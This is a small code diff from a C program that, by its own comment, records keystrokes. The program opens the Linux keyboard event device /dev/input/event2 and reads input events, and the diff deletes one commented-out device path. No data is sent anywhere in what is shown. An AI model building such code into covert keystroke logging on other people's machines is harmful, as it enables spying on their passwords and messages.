@@ -93,7 +93,6 @@ void main()
 	char message[SIZEOF_MESSAGE];
 
 	//open the eventX file that records keystrokes
-	//char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
 	char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/event2";
 	int device = open(keyboardPath_EVENTUALLYREPLACE, O_RDONLY);
 	struct input_event inpEvent;
